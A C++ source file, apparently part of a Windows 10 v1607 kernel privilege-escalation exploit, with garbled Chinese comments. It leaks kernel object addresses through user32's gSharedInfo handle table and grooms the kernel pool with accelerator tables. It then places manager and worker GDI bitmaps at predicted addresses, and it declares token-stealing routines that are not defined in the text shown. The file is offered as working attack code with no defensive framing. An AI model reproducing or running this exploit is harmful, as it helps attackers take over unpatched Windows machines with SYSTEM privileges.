// Windows10_V1607.cpp : �������̨Ӧ�ó������ڵ㡣
//
#include <Windows.h>
#include <winnt.h>
#include <stdio.h>
#include <Psapi.h>
#include <profileapi.h>
#include <locale.h>
#include <winternl.h>
#include <string.h>

VOID Get_BitMap_Address(void);

ULONG64 *Where_TO_DO = NULL, M_BitMap_Address = NULL, W_BitMap_Address = NULL, Next_EPROCESS = NULL, User_Token_Address = NULL, System_EPROCESS = NULL, EPROCESS = NULL, SystemToken = NULL;
HBITMAP M_BitMap = NULL, W_BitMap = NULL;

DWORD processId = GetCurrentProcessId();

VOID Uninit_GDI(void);
ULONG64 GetNTOsBase(void);
ULONG64 Use_Were_What(void);
ULONG64 Find_This_Token(void);
ULONG64 PsInitialSystemProcess(void);

typedef struct _SERVERINFO{
	DWORD dwSRVIFlags;
	DWORD cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
} SERVERINFO, *PSERVERINFO;

typedef struct _USER_HANDLE_ENTRY {
	void* pKernel;
	union{
		PVOID pi;
		PVOID pti;
		PVOID ppi;
	};
	BYTE type;
	BYTE flags;
	WORD generation;
} USER_HANDLE_ENTRY, *PUSER_HANDLE_ENTRY;

typedef struct _SHAREDINFO{
	PSERVERINFO psi;
	PUSER_HANDLE_ENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelts;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
} SHAREDINFO, *PSHAREDINFO;

int main(void){

	//CreateAcceleratorTableA();
	//M_BitMap
	Get_BitMap_Address();
	//W_BitMap
	Get_BitMap_Address();

	getchar();

	return 0;
}


VOID Get_BitMap_Address(void){
	HACCEL hAccel = NULL;
	DWORD64 Old_Addr = NULL,New_Addr = 1;
	LPACCEL AlcAccel = NULL;
	SIZE_T ACCEL_SIZE = sizeof(ACCEL),NumberOf = 0x300;
	PUSER_HANDLE_ENTRY handleTable = NULL, leakaddr = NULL;
	PSHAREDINFO pfindSharedInfo = NULL;

	ULONG64 *Data = (ULONG64*)malloc((ACCEL_SIZE * NumberOf) - 0x260);

	memset(Data,'A',(ACCEL_SIZE * NumberOf) - 0x260);

	printf("Data_Address:0x%p\n", Data);
	//����0x600�ֽڴ�С�Ŀ�
	AlcAccel = (LPACCEL)LocalAlloc(LPTR, ACCEL_SIZE * NumberOf);

	pfindSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandleW(L"user32.dll"),"gSharedInfo");
	handleTable = pfindSharedInfo->aheList;

	for (int i = 0; i <= 10; ++i){
		//����һ�������������
		hAccel = CreateAcceleratorTable(AlcAccel, NumberOf);
		leakaddr = &handleTable[LOWORD(hAccel)];
		Old_Addr = (DWORD64)(leakaddr->pKernel);

		if (Old_Addr == New_Addr){
			DestroyAcceleratorTable(hAccel);
			break;
		}else{
			New_Addr = Old_Addr;
			DestroyAcceleratorTable(hAccel);
			printf("[+]leak address : 0x%p\n", Old_Addr);
		}
	}
	if (M_BitMap == NULL){
		M_BitMap = CreateBitmap(0x0FA0, 0x01, 0x01, 0x08, Data);
		M_BitMap_Address = New_Addr + 0x50;
	}else{
		W_BitMap = CreateBitmap(0x0FA0, 0x01, 0x01, 0x08, Data);
		W_BitMap_Address = New_Addr + 0x50;
	}
}

